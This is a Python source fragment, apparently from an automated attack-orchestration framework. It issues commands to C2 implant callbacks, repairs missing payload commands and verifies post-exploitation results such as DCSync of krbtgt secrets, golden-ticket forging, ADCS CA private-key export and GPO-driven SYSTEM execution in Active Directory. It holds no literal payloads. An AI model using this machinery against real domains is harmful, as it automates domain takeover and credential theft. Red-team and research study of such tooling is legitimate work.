        binding = await self._prepare_capability_command_binding(command_obj, callback_id)
        if not binding.get("ok"):
            item = self._capability_executor_command_item(
                command_obj,
                original_command,
                original_parameters,
                callback_id,
                None,
                binding.get("reason") or "Construction failure: payload mechanic binding failed",
            )
            if binding.get("provider_blocked"):
                item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
                item["repair_attempt"] = 1
                item["repair_kind"] = "operation_provider_rebuild_required"
                item["repair_reason"] = binding.get("reason") or "multi-command operation provider requires capability rebuild"
            else:
                item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
            if binding.get("repair_attempted"):
                item["repair_attempt"] = 1
                item["repair_kind"] = "payload_mechanic_substitute"
                item["repair_reason"] = binding.get("reason") or "payload mechanic substitute was rejected"
            return item

        command_name = self._capability_text(binding.get("command") or original_command)
        parameters = binding.get("parameters", original_parameters)
        if command_name == "wait_for_seconds":
            seconds = 0
            reason = ""
            if isinstance(parameters, dict):
                try:
                    seconds = int(parameters.get("seconds") or 0)
                except (TypeError, ValueError):
                    seconds = 0
                reason = self._capability_text(parameters.get("reason"))
            seconds = max(1, min(seconds or 300, 600))
            trace_id = self._next_capability_command_trace_id()
            await self._notify_capability_command_observer(
                trace_id=trace_id,
                status="started",
                command_obj=command_obj,
                command_name=command_name,
                parameters=parameters,
                callback_id=callback_id,
                capability_name=capability_name,
            )

            async def heartbeat(elapsed: int, remaining: int) -> None:
                def display_duration(value: int) -> str:
                    if value >= 60 and value % 60 == 0:
                        minutes = value // 60
                        return f"{minutes} minute{'s' if minutes != 1 else ''}"
                    return f"{value} seconds"

                await self._notify_capability_command_observer(
                    trace_id=trace_id,
                    status="progress",
                    command_obj=command_obj,
                    command_name=command_name,
                    parameters=parameters,
                    callback_id=callback_id,
                    capability_name=capability_name,
                    result_preview=(
                        f"{display_duration(elapsed)} elapsed; "
                        f"{display_duration(remaining)} remaining"
                    ),
                )

            output = await self._bounded_wait_for_seconds(seconds, reason=reason, heartbeat=heartbeat)
            task_id = None
        else:
            if self._capability_executor_allows_repeated_probe(command_obj):
                try:
                    self._task_failure_counts.pop(
                        self._task_failure_key(command_name, int(callback_id), parameters),
                        None,
                    )
                except Exception:
                    pass
            output, task_id, trace_id = await self._issue_capability_callback_command(
                command_obj,
                command_name,
                parameters,
                callback_id,
                timeout,
                capability_name,
            )
        item = self._capability_executor_command_item(
            command_obj,
            command_name,
            parameters,
            callback_id,
            task_id,
            output,
        )
        if binding.get("provider_resolved"):
            item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
            item["repair_attempt"] = 1
            item["repair_kind"] = "operation_provider_substitute"
            item["repair_reason"] = binding.get("reason") or "resolved missing native operation through deterministic provider"
        elif binding.get("repair_attempted"):
            item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
            item["repair_attempt"] = 1
            item["repair_kind"] = "payload_mechanic_substitute"
            item["repair_reason"] = binding.get("reason") or "replaced missing payload mechanic from live command surface"
        if trace_id:
            await self._complete_capability_command_trace(
                trace_id=trace_id,
                command_obj=command_obj,
                command_name=command_name,
                parameters=parameters,
                callback_id=callback_id,
                capability_name=capability_name,
                item=item,
            )
        if command_name == "wait_for_seconds" or not self._capability_executor_task_failed(item):
            return item

        repair = await self._construction_repair_parameters(
            command_name,
            parameters,
            callback_id,
            self._capability_text(output),
        )
        if repair is None:
            return item
        repaired_parameters, repair_kind = repair
        retry_output, retry_task_id, retry_trace_id = await self._issue_capability_callback_command(
            command_obj,
            command_name,
            repaired_parameters,
            callback_id,
            timeout,
            capability_name,
        )
        retry_item = self._capability_executor_command_item(
            command_obj,
            command_name,
            repaired_parameters,
            callback_id,
            retry_task_id,
            retry_output,
        )
        retry_item["repair_attempt"] = 1
        retry_item["repair_kind"] = repair_kind
        retry_item["repair_reason"] = "construction failure repaired from live payload schema"
        if binding.get("provider_resolved"):
            retry_item["operation_provider"] = self._capability_executor_public_operation_provider(binding)
        elif binding.get("repair_attempted"):
            retry_item["mechanic_repair"] = self._capability_executor_public_mechanic_repair(binding)
        if task_id is not None:
            retry_item["retry_of_task_id"] = task_id
        retry_item["repair_history"] = [self._capability_executor_public_issued([item])[0]]
        await self._complete_capability_command_trace(
            trace_id=retry_trace_id,
            command_obj=command_obj,
            command_name=command_name,
            parameters=repaired_parameters,
            callback_id=callback_id,
            capability_name=capability_name,
            item=retry_item,
        )
        return retry_item

    async def _prepare_capability_command_binding(self, command_obj: dict, callback_id: int) -> dict:
        """Authenticate one deterministic command against the live payload surface.

        Existing valid bindings stay deterministic. Only a command that is authoritatively absent from
        the callback's live command surface may invoke one bounded mechanic substitution.
        """
        command_name = self._capability_text(command_obj.get("command"))
        parameters = command_obj.get("parameters", "")
        if command_name == "wait_for_seconds":
            return {"ok": True, "command": command_name, "parameters": parameters}

        operation = self._capability_text(command_obj.get("operation"))
        if operation:
            payload_type, command_surface, _surface_reason = await self._fetch_live_command_surface(callback_id)
            if command_surface is not None:
                try:
                    from . import mechanic_repair
                except ImportError:
                    import mechanic_repair
                canonical = mechanic_repair.canonical_command_name(command_surface, command_name)
                auth = {
                    "status": "available" if canonical else "missing",
                    "command": canonical or command_name,
                    "payload_type": payload_type,
                    "command_surface": command_surface,
                }
            else:
                # No authoritative surface means there is nothing safe to repair against. Preserve the
                # existing issue-time schema path instead of consuming a speculative schema lookup here.
                return {
                    "ok": True,
                    "command": command_name,
                    "parameters": parameters,
                    "payload_type": payload_type or "",
                }
        else:
            return {"ok": True, "command": command_name, "parameters": parameters}
        if auth.get("status") == "available":
            return {
                "ok": True,
                "command": auth.get("command") or command_name,
                "parameters": parameters,
                "payload_type": auth.get("payload_type") or "",
            }

        if auth.get("status") != "missing":
            return {
                "ok": True,
                "command": command_name,
                "parameters": parameters,
                "payload_type": auth.get("payload_type") or "",
            }
        provider_binding = self._resolve_missing_operation_provider(command_obj, auth)
        if provider_binding is not None:
            return provider_binding
        return await self._repair_missing_capability_command(command_obj, callback_id, auth)

    def _resolve_missing_operation_provider(self, command_obj: dict, auth: dict) -> dict | None:
        """Resolve a missing native binding through a catalogued equivalent provider."""
        try:
            try:
                from . import operation_providers
            except ImportError:
                import operation_providers

            payload_type = self._capability_text(auth.get("payload_type"))
            command_surface = auth.get("command_surface") if isinstance(auth.get("command_surface"), list) else []
            candidate = operation_providers.live_provider_candidate(
                command_obj,
                payload_type=payload_type,
                command_surface=command_surface,
            )
            if not isinstance(candidate, dict):
                return None
            if candidate.get("blocked"):
                return {
                    "ok": False,
                    "command": self._capability_text(command_obj.get("command")),
                    "parameters": command_obj.get("parameters", ""),
                    "payload_type": payload_type,
                    "provider_blocked": True,
                    "provider": self._capability_text(candidate.get("provider")),
                    "provider_kind": self._capability_text(candidate.get("provider_kind")),
                    "provider_context": self._capability_text(candidate.get("provider_context")),
                    "original_command": self._capability_text(command_obj.get("command")),
                    "rationale": self._capability_text(candidate.get("reason")),
                    "reason": "Construction failure: " + self._capability_text(candidate.get("reason")),
                }
            validated, rejection = self._validate_mechanic_repair_candidate(
                command_obj,
                command_surface,
                candidate,
            )
            if validated is None:
                logger.info(
                    "🧭 [operation-provider] rejected payload=%s operation=%s provider=%s reason=%s",
                    payload_type,
                    command_obj.get("operation"),
                    candidate.get("provider"),
                    rejection,
                )
                return None
            resolved = {
                "ok": True,
                "command": validated["command"],
                "parameters": validated["parameters"],
                "payload_type": payload_type,
                "provider_resolved": True,
                "provider": self._capability_text(candidate.get("provider")),
                "provider_kind": self._capability_text(candidate.get("provider_kind")),
                "provider_context": self._capability_text(candidate.get("provider_context")),
                "original_command": self._capability_text(command_obj.get("command")),
                "rationale": validated.get("rationale") or self._capability_text(candidate.get("rationale")),
                "reason": "resolved missing native operation through deterministic provider catalog",
            }
            self._register_repaired_capability_command(
                command_obj,
                resolved["command"],
                resolved["parameters"],
                provider=resolved,
            )
            logger.info(
                "🧭 [operation-provider] accepted payload=%s operation=%s provider=%s original=%s replacement=%s",
                payload_type,
                command_obj.get("operation"),
                resolved["provider"],
                resolved["original_command"],
                resolved["command"],
            )
            return resolved
        except Exception as exc:
            logger.info(
                "🧭 [operation-provider] resolution failed operation=%s reason=%s",
                command_obj.get("operation"),
                exc,
            )
            return None

    async def _repair_missing_capability_command(self, command_obj: dict, callback_id: int, auth: dict) -> dict:
        try:
            from . import mechanic_repair
        except ImportError:
            import mechanic_repair

        command_name = self._capability_text(command_obj.get("command"))
        parameters = command_obj.get("parameters", "")
        payload_type = self._capability_text(auth.get("payload_type"))
        command_surface = auth.get("command_surface") if isinstance(auth.get("command_surface"), list) else []
        key = (
            payload_type.casefold(),
            self._capability_text(command_obj.get("operation")).casefold(),
            _capability_command_key(command_name, parameters),
        )
        if key in self._mechanic_repair_cache:
            cached = self._mechanic_repair_cache[key]
            if isinstance(cached, dict):
                return dict(cached)
            return {
                "ok": False,
                "command": command_name,
                "parameters": parameters,
                "payload_type": payload_type,
                "repair_attempted": True,
                "original_command": command_name,
                "reason": (
                    "Construction failure: no valid bounded payload mechanic substitute was found for "
                    f"operation '{self._capability_text(command_obj.get('operation'))}' on payload '{payload_type}'."
                ),
            }

        resolver = getattr(self, "_mechanic_repair_resolver", None)
        if not callable(resolver):
            self._mechanic_repair_cache[key] = None
            return {
                "ok": False,
                "command": command_name,
                "parameters": parameters,
                "payload_type": payload_type,
                "repair_attempted": False,
                "original_command": command_name,
                "reason": self._missing_live_command_message(command_name, payload_type, callback_id),
            }

        safe_command_obj = dict(command_obj)
        safe_command_obj["parameters"] = self._mechanic_repair_safe_parameters(parameters)
        request = mechanic_repair.build_request(
            payload_type=payload_type,
            callback_id=callback_id,
            command_obj=safe_command_obj,
            command_surface=command_surface,
            reason=self._missing_live_command_message(command_name, payload_type, callback_id),
        )
        try:
            candidate_value = resolver(request)
            if inspect.isawaitable(candidate_value):
                candidate_value = await candidate_value
            candidate = mechanic_repair.parse_candidate(candidate_value)
        except Exception as exc:
            candidate = None
            logger.info("🧭 [mechanic-repair] resolver failed payload=%s operation=%s reason=%s", payload_type, command_obj.get("operation"), exc)

        validated, rejection = self._validate_mechanic_repair_candidate(
            command_obj,
            command_surface,
            candidate,
        )
        if validated is None:
            self._mechanic_repair_cache[key] = None
            return {
                "ok": False,
                "command": command_name,
                "parameters": parameters,
                "payload_type": payload_type,
                "repair_attempted": True,
                "original_command": command_name,
                "reason": (
                    "Construction failure: bounded payload mechanic repair did not produce a valid substitute "
                    f"for operation '{self._capability_text(command_obj.get('operation'))}' on payload '{payload_type}': "
                    f"{rejection or 'no candidate returned'}"
                ),
            }

        repaired = {
            "ok": True,
            "command": validated["command"],
            "parameters": validated["parameters"],
            "payload_type": payload_type,
            "repair_attempted": True,
            "original_command": command_name,
            "rationale": validated.get("rationale") or "",
            "reason": "replaced missing payload mechanic from live command surface",
        }
        self._register_repaired_capability_command(command_obj, repaired["command"], repaired["parameters"])
        self._mechanic_repair_cache[key] = dict(repaired)
        logger.info(
            "🧭 [mechanic-repair] accepted payload=%s operation=%s original=%s replacement=%s",
            payload_type,
            command_obj.get("operation"),
            command_name,
            repaired["command"],
        )
        return repaired

    def _validate_mechanic_repair_candidate(
        self,
        command_obj: dict,
        command_surface: list[dict],
        candidate: dict | None,
    ) -> tuple[dict | None, str]:
        try:
            from . import mechanic_repair
        except ImportError:
            import mechanic_repair

        if not isinstance(candidate, dict):
            return None, "no candidate returned"
        command_name = mechanic_repair.canonical_command_name(command_surface, candidate.get("command"))
        if not command_name:
            return None, "candidate command is absent from the live payload surface"
        names = mechanic_repair.command_names(command_surface)
        if command_name.casefold() == "shell" and "run" in names:
            return None, "shell substitute rejected because the live payload exposes run"

        schema = mechanic_repair.command_schema(command_surface, command_name)
        if schema is None:
            return None, "candidate command schema is unavailable"
        parameters = candidate.get("parameters", {})
        if parameters is None:
            parameters = {}
        if isinstance(parameters, str):
            if parameters.strip():
                repaired = self._schema_single_string_parameters(command_name, parameters, schema)
                if repaired is None:
                    return None, "string parameters do not match the candidate command schema"
                parameters = repaired
            else:
                parameters = {}
        if not isinstance(parameters, dict):
            return None, "candidate parameters must be a JSON object"
        resolved = command_builder.resolve_params(schema, parameters, command=command_name)
        if not resolved.ok:
            return None, resolved.repair or "candidate parameters do not match the live schema"
        parameters = resolved.params
        if not parameters:
            parameters = ""

        original_placeholders = self._capability_executor_placeholders(command_obj.get("parameters", ""))
        candidate_placeholders = self._capability_executor_placeholders(parameters)
        if candidate_placeholders - original_placeholders:
            return None, "candidate introduced runtime placeholders outside the original operation contract"
        if original_placeholders - candidate_placeholders:
            return None, "candidate dropped runtime placeholders required by the original operation contract"
        return {
            "command": command_name,
            "parameters": parameters,
            "rationale": self._capability_text(candidate.get("rationale")),
        }, ""

    def _register_repaired_capability_command(
        self,
        command_obj: dict,
        command_name: str,
        parameters,
        *,
        provider: dict | None = None,
    ) -> None:
        original_command = self._capability_text(command_obj.get("command"))
        original_parameters = command_obj.get("parameters", "")
        context = self._deterministic_capability_command_context(original_command, original_parameters)
        if not context:
            context = {
                "capability": self._capability_text(command_obj.get("capability")),
                "operation": self._capability_text(command_obj.get("operation")),
                "purpose": self._capability_text(command_obj.get("purpose")),
                "expected_probe": self._capability_text(command_obj.get("expected_probe")),
                "produces": list(command_obj.get("produces") or []),
                "consumes": list(command_obj.get("consumes") or []),
            }
        context = dict(context)
        if isinstance(provider, dict):
            context["operation_provider"] = {
                "name": self._capability_text(provider.get("provider")),
                "kind": self._capability_text(provider.get("provider_kind")),
                "context": self._capability_text(provider.get("provider_context")),
                "original_command": original_command,
                "replacement_command": command_name,
            }
        else:
            context["mechanic_repair"] = {
                "original_command": original_command,
                "replacement_command": command_name,
            }
        self._deterministic_capability_command_contexts[
            _capability_command_key(command_name, parameters)
        ] = context
        ticket_key = _ticket_command_key(command_name, parameters)
        if ticket_key:
            self._deterministic_ticket_command_keys.add(ticket_key)
            self._deterministic_ticket_command_contexts[ticket_key] = context

    def _mechanic_repair_safe_parameters(self, parameters):
        if isinstance(parameters, dict):
            out = {}
            for key, value in parameters.items():
                if isinstance(value, str) and value.strip().startswith("{{") and value.strip().endswith("}}"):
                    out[key] = value
                else:
                    out[key] = self._capability_executor_safe_parameters({key: value}).get(key)
            return out
        return self._capability_executor_safe_parameters(parameters)

    def _capability_executor_public_mechanic_repair(self, binding: dict) -> dict:
        attempted = bool(binding.get("repair_attempted"))
        return {
            "attempted": attempted,
            "status": "accepted" if binding.get("ok") and attempted else ("failed" if attempted else "not_attempted"),
            "payload_type": self._capability_text(binding.get("payload_type")),
            "original_command": self._capability_text(binding.get("original_command")),
            "replacement_command": self._capability_text(binding.get("command")) if binding.get("ok") else "",
            "rationale": self._capability_text(binding.get("rationale")),
        }

    def _capability_executor_public_operation_provider(self, binding: dict) -> dict:
        return {
            "status": "accepted" if binding.get("ok") and binding.get("provider_resolved") else "failed",
            "payload_type": self._capability_text(binding.get("payload_type")),
            "name": self._capability_text(binding.get("provider")),
            "kind": self._capability_text(binding.get("provider_kind")),
            "context": self._capability_text(binding.get("provider_context")),
            "original_command": self._capability_text(binding.get("original_command")),
            "replacement_command": self._capability_text(binding.get("command")) if binding.get("ok") else "",
            "rationale": self._capability_text(binding.get("rationale")),
        }

    def _capability_executor_command_item(
        self,
        command_obj: dict,
        command_name: str,
        parameters,
        callback_id: int,
        task_id,
        output,
    ) -> dict:
        result_class = command_builder.classify_result(command_name, output)
        if self._capability_text(output).casefold().startswith("construction failure:"):
            result_class = command_builder.ResultClass.CONSTRUCTION.value
        item = {
            "command": command_name,
            "purpose": self._capability_text(command_obj.get("purpose")),
            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
            "produces": list(command_obj.get("produces") or []),
            "consumes": list(command_obj.get("consumes") or []),
            "parameters": self._capability_executor_safe_parameters(parameters),
            "task_id": task_id,
            "callback_id": callback_id,
            "result_class": result_class,
            "output_preview": self._capability_executor_output_preview(output),
            "_output": self._capability_text(output),
        }
        if self._capability_executor_task_failed(item):
            item["failure_reason"] = self._capability_executor_failure_reason(output)
        return item

    def _capability_executor_verify_output(
        self,
        action,
        inputs: dict,
        callback_id: int,
        output: str,
        command_obj: dict,
        capabilities_mod,
        *,
        allow_preflight: bool = False,
    ):
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        expected_probe = self._capability_text(command_obj.get("expected_probe")).casefold()
        if capability == "gpo-controlled-system-exec":
            if expected_probe not in {
                "extract_gpo_system_exec_probe",
                "extract_gpo_domain_admin_membership_probe",
            }:
                return None, None
            if expected_probe == "extract_gpo_domain_admin_membership_probe":
                membership = self._extract_domain_admin_membership_probe(output)
                probe = {
                    "domain_admin_membership_proven": bool(membership.get("domain_admin")),
                    "system_command_succeeded": bool(membership.get("domain_admin")),
                    "group_query_succeeded": bool(membership.get("group_query_succeeded")),
                    "principal_present": bool(membership.get("principal_present")),
                    "principal_candidates": list(membership.get("principal_candidates") or []),
                    "access_denied": bool(membership.get("access_denied")),
                    "callback_id": self._capability_text(callback_id),
                }
            else:
                probe = dict(capabilities_mod.extract_gpo_system_exec_probe(output))
                probe["callback_id"] = self._capability_text(callback_id)
                if not self._capability_executor_is_final_probe(command_obj):
                    # A structured GPO artifact can legitimately contain strings like
                    # `NT AUTHORITY\SYSTEM` in its author field. Those setup reads are
                    # useful for artifact validation, but they are not execution proof.
                    probe["system_callback_observed"] = False
                    probe["system_command_succeeded"] = False
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability == "grant-directory-rights":
            if (
                expected_probe != "extract_directory_rights_probe"
                or not self._capability_executor_is_final_probe(command_obj)
            ):
                return None, None
            probe = dict(capabilities_mod.extract_directory_rights_probe(
                output,
                acl_entries=[output],
                domain=self._capability_domain(action, inputs),
            ))
            probe["callback_id"] = self._capability_text(callback_id)
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability == "adcs-certificate-auth":
            allowed_probes = {
                "extract_adcs_certificate_auth_probe",
                "extract_account_ticket_cache_probe",
                "extract_certificate_pkinit_probe",
                "extract_logon_context_probe",
                "extract_ticket_import_probe",
                "extract_ticket_probe",
            }
            if expected_probe not in allowed_probes:
                return None, None
            if (
                not allow_preflight
                and expected_probe == "extract_ticket_probe"
                and not self._capability_executor_is_current_context_service_proof(command_obj)
            ):
                return None, None
            account = self._capability_account(action, inputs) or "administrator"
            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
            proof_marker = self._capability_text(
                inputs.get("proof_marker")
                or inputs.get("auth_marker")
                or getattr(action, "intent", {}).get("proof_marker")
                or getattr(action, "intent", {}).get("auth_marker")
            )
            probe = dict(capabilities_mod.extract_adcs_certificate_auth_probe(
                output,
                account,
                domain,
                proof_marker,
            ))
            probe["callback_id"] = self._capability_text(callback_id)
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability == "execute-as-local-admin":
            if expected_probe != "extract_remote_execution_probe":
                return None, None
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            proof_marker = self._capability_text(
                inputs.get("proof_marker")
                or getattr(action, "intent", {}).get("proof_marker")
            )
            probe = dict(capabilities_mod.extract_remote_execution_probe(
                output,
                target_host,
                target_domain,
                proof_marker,
            ))
            probe["callback_id"] = self._capability_text(callback_id)
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability == "adcs-ca-private-key-export":
            if expected_probe != "extract_adcs_ca_private_key_probe":
                return None, None
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            proof_marker = self._capability_text(
                inputs.get("proof_marker")
                or inputs.get("export_marker")
                or getattr(action, "intent", {}).get("proof_marker")
                or getattr(action, "intent", {}).get("export_marker")
            )
            probe = dict(capabilities_mod.extract_adcs_ca_private_key_probe(
                output,
                target_host,
                target_domain,
                proof_marker,
            ))
            probe["callback_id"] = self._capability_text(callback_id)
            probe.update(self._persist_adcs_ca_export_artifact(output, target_host, target_domain))
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability == "adcs-esc-certificate-enroll":
            if expected_probe != "extract_adcs_enrolled_certificate_probe":
                return None, None
            account = self._capability_account(action, inputs) or "administrator"
            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
            proof_marker = self._capability_text(
                inputs.get("proof_marker")
                or inputs.get("enroll_marker")
                or getattr(action, "intent", {}).get("proof_marker")
                or getattr(action, "intent", {}).get("enroll_marker")
            )
            probe = dict(capabilities_mod.extract_adcs_enrolled_certificate_probe(
                output,
                account,
                domain,
                proof_marker,
            ))
            probe["callback_id"] = self._capability_text(callback_id)
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability in {"dcsync", "dcsync-krbtgt", "dcsync-account"}:
            if expected_probe != "extract_dcsync_secret_probe":
                return None, None
            probe = dict(capabilities_mod.extract_dcsync_secret_probe(output))
            probe["callback_id"] = self._capability_text(callback_id)
            domain = self._capability_domain(action, inputs)
            if domain:
                probe["domain"] = self._capability_text(domain).casefold()
            account = self._capability_account(action, inputs)
            if not account and capability in {"dcsync", "dcsync-krbtgt"}:
                account = "krbtgt"
            if account:
                probe["account"] = self._capability_text(account).casefold()
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
            if capability == "forge-golden-ticket" and expected_probe == "extract_dcsync_secret_probe":
                # Cross-domain (child->parent) proof. After importing an EA-capable Kerberos context, a DCSync
                # that replicates the PARENT krbtgt secret proves domain-admin-equivalent control of the parent
                # domain. Windows usually acquires the referral/service tickets on demand; an explicit asktgs
                # fallback may also have produced them. The ticket/service-access probes never recognized this,
                # so a perfect DCSync scored "failed — no forged ticket evidence". Map a parent-krbtgt dump to
                # domain_admin, scoped to the target (parent) domain via a boundary match so a CHILD-domain dump
                # (whose name CONTAINS the parent label, e.g. child.root.example.local) cannot satisfy a parent
                # proof.
                target_domain = self._capability_text(
                    self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
                ).casefold()
                probe = dict(capabilities_mod.extract_dcsync_secret_probe(output))
                probe["callback_id"] = self._capability_text(callback_id)
                if target_domain:
                    probe["domain"] = target_domain
                krbtgt_dumped = bool(probe.get("krbtgt_hash_present") or probe.get("domain_hashes_dumped"))
                parent_in_output = bool(target_domain) and _re_mod.search(
                    r"(?<![\w.])" + _re_mod.escape(target_domain),
                    self._capability_text(output).casefold(),
                ) is not None
                if krbtgt_dumped and parent_in_output:
                    probe["domain_admin"] = True
                    self._log_dcsync_proof_fire(target_domain, len(self._capability_text(output)))
                verification = capabilities_mod.verify_capability(capability, probe)
                return probe, verification
            if expected_probe == "extract_logon_context_probe":
                low = self._capability_text(output).casefold()
                probe = {
                    "callback_id": self._capability_text(callback_id),
                    "logon_context_proven": (
                        "successfully set primary identity" in low
                        or "successfully impersonated" in low
                        or "new claims" in low
                    ),
                }
                verification = capabilities_mod.verify_capability(capability, probe)
                return probe, verification
            if expected_probe not in {
                "extract_ticket_probe",
                "extract_account_ticket_probe",
                "extract_ticket_cache_probe",
                "extract_account_ticket_cache_probe",
            }:
                return None, None
            domain = (
                self._capability_target_domain(action, inputs)
                or self._capability_domain(action, inputs)
                or self._capability_source_domain(action, inputs)
                or self._capability_account_domain(action, inputs)
            )
            try:
                try:
                    from . import credential_artifacts
                except ImportError:
                    import credential_artifacts
                expected_domain = None if capability == "ensure-account-kerberos-context" else domain
                probe = dict(credential_artifacts.extract_ticket_probe(output, expected_domain=expected_domain))
            except Exception:
                probe = {}
            probe["callback_id"] = self._capability_text(callback_id)
            if domain:
                probe["domain"] = self._capability_text(domain).casefold()
            if capability == "ensure-account-kerberos-context":
                account = self._capability_account(action, inputs)
                if account:
                    probe["account"] = account
                if probe.get("tgt_present") and account and account.casefold() in self._capability_text(output).casefold():
                    probe["account_ticket_present"] = True
            verification = capabilities_mod.verify_capability(capability, probe)
            return probe, verification
        return None, None

    def _capability_executor_merge_probe(self, current: dict | None, update: dict | None) -> dict:
        """Merge positive verifier facts observed across a multi-command capability run."""
        merged = dict(current or {})
        if not isinstance(update, dict):
            return merged
        negative_keys = {
            "access_denied",
            "artifact_valid",
            "auth_failed",
            "bad_domain_sid",
            "bad_key",
            "bad_krbtgt_key",
            "callback_dead",
            "clock_skew",
            "error",
            "exception",
            "failed",
            "kdc_rejected",
            "logon_failure",
            "logon_context_failed",
            "network_path_not_found",
            "service_access_denied",
            "ticket_error",
            "ticket_injection_failed",
            "xml_invalid",
            "xml_parse_error",
            "xml_valid",
        }
        identity_keys = {
            "account",
            "callback",
            "callback_display_id",
            "callback_id",
            "domain",
            "principal",
            "realm",
            "target_domain",
            "user",
        }
        for key, value in update.items():
            if key in negative_keys:
                continue
            if isinstance(value, bool):
                if value:
                    merged[key] = True
                elif key not in merged:
                    merged[key] = False
                continue
            if isinstance(value, list):
                if not value:
                    continue
                existing = merged.get(key)
                combined = list(existing) if isinstance(existing, list) else []
                for item in value:
                    if item not in combined:
                        combined.append(item)
                merged[key] = combined
                continue
            if isinstance(value, dict):
                if value:
                    prior = merged.get(key)
                    if isinstance(prior, dict):
                        merged[key] = {**prior, **value}
                    else:
                        merged[key] = dict(value)
                continue
            text = self._capability_text(value).strip()
            if not text:
                continue
            if key in identity_keys or not self._capability_text(merged.get(key)).strip():
                merged[key] = value
        if any(
            key in merged
            for key in (
                "certificate_auth_method",
                "certificate_auth_status",
                "pkinit_tgt_present",
                "schannel_ldap_bind",
                "ntlm_hash_present",
                "certificate_auth_proven",
            )
        ):
            method = self._capability_text(merged.get("certificate_auth_method")).casefold()
            status = self._capability_text(merged.get("certificate_auth_status")).casefold()
            auth_specific = (
                bool(merged.get("pkinit_tgt_present"))
                or bool(merged.get("schannel_ldap_bind"))
                or bool(merged.get("ntlm_hash_present"))
                or method in {"pkinit", "schannel-ldap", "schannel_ldap", "certipy", "cert-auth", "certificate-auth"}
                or status == "ok"
            )
            access_signal = (
                bool(merged.get("service_access_proven"))
                or bool(merged.get("domain_admin"))
                or bool(merged.get("schannel_ldap_bind"))
                or bool(merged.get("ntlm_hash_present"))
            )
            merged["certificate_auth_proven"] = bool(auth_specific and access_signal)
            merged["ticket_valid"] = bool((merged.get("ticket_valid") or merged.get("service_access_proven")) and auth_specific)
        return merged

    def _capability_transaction_start(self, action, build_payload: dict) -> dict:
        commands = list(build_payload.get("commands") or []) if isinstance(build_payload, dict) else []
        artifact_obligations = sorted({
            self._capability_text(item)
            for command_obj in commands
            for item in list(command_obj.get("produces") or [])
            if self._capability_text(item).casefold().startswith("artifact:")
        })
        delayed_effect_obligations = sorted({
            self._capability_text(item)
            for command_obj in commands
            for item in list(command_obj.get("produces") or [])
            if self._capability_text(item).casefold().startswith("event:")
        })
        proof_obligations = sorted({
            self._capability_text(command_obj.get("expected_probe"))
            for command_obj in commands
            if self._capability_executor_is_final_probe(command_obj)
            and self._capability_text(command_obj.get("expected_probe"))
        })
        return {
            "capability": self._capability_text(getattr(action, "name", "")),
            "target": self._capability_text(getattr(action, "target", "")),
            "required_effects": list(getattr(action, "effects", []) or []),
            "artifact_obligations": artifact_obligations,
            "delayed_effect_obligations": delayed_effect_obligations,
            "proof_obligations": proof_obligations,
            "validated_artifacts": [],
            "status": "open",
            "pin_planner": True,
            "events": [],
        }

    def _capability_transaction_update_artifact(self, transaction: dict, command_obj: dict, output: str, capabilities_mod) -> None:
        if not isinstance(transaction, dict):
            return
        try:
            artifact_probe = dict(capabilities_mod.validate_structured_artifacts(output))
        except Exception as exc:
            artifact_probe = {
                "structured_artifact_observed": False,
                "artifact_error": self._capability_text(exc),
            }
        expects_artifact = self._capability_transaction_expects_structured_artifact(command_obj)
        if not expects_artifact:
            return
        observed = artifact_probe.get("structured_artifact_observed") is True
        artifact_type = self._capability_text(artifact_probe.get("artifact_type") or "structured")
        event = {
            "stage": "artifact_validation",
            "command": self._capability_text(command_obj.get("command")),
            "expected": bool(expects_artifact),
            "artifact_type": artifact_type,
            "observed": bool(observed),
        }
        if observed:
            valid = artifact_probe.get("artifact_valid") is True
            event["valid"] = valid
            if artifact_probe.get("xml_parse_error"):
                event["parse_error"] = self._capability_text(artifact_probe.get("xml_parse_error"))
            transaction.setdefault("events", []).append(event)
            if valid:
                marker = f"artifact:{artifact_type}_validated"
                validated = transaction.setdefault("validated_artifacts", [])
                if marker not in validated:
                    validated.append(marker)
                return
            if self._capability_transaction_artifact_failure_is_nonblocking(transaction):
                event["nonblocking"] = True
                event["reason"] = self._capability_text(
                    artifact_probe.get("xml_parse_error")
                    or artifact_probe.get("artifact_error")
                    or f"{artifact_type} artifact was syntactically invalid"
                )
                transaction.setdefault("artifact_warnings", []).append(event)
                return
            transaction["status"] = "artifact_invalid"
            transaction["pin_planner"] = True
            transaction["pin_reason"] = self._capability_text(
                artifact_probe.get("xml_parse_error")
                or artifact_probe.get("artifact_error")
                or f"{artifact_type} artifact was syntactically invalid"
            )
            transaction["blocker"] = {
                "stage": "artifact_validation",
                "artifact_type": artifact_type,
                "reason": transaction["pin_reason"],
            }
            return
        event["valid"] = False
        event["reason"] = "expected structured artifact output was not observed"
        transaction.setdefault("events", []).append(event)
        if self._capability_transaction_artifact_failure_is_nonblocking(transaction):
            event["nonblocking"] = True
            transaction.setdefault("artifact_warnings", []).append(event)
            return
        transaction["status"] = "artifact_missing"
        transaction["pin_planner"] = True
        transaction["pin_reason"] = event["reason"]
        transaction["blocker"] = {
            "stage": "artifact_validation",
            "artifact_type": artifact_type,
            "reason": event["reason"],
        }

    def _capability_transaction_update_verification(self, transaction: dict, command_obj: dict, verification) -> None:
        if not isinstance(transaction, dict) or verification is None:
            return
        verdict = self._capability_text(getattr(verification, "verdict", ""))
        final_probe = self._capability_executor_is_final_probe(command_obj)
        event = {
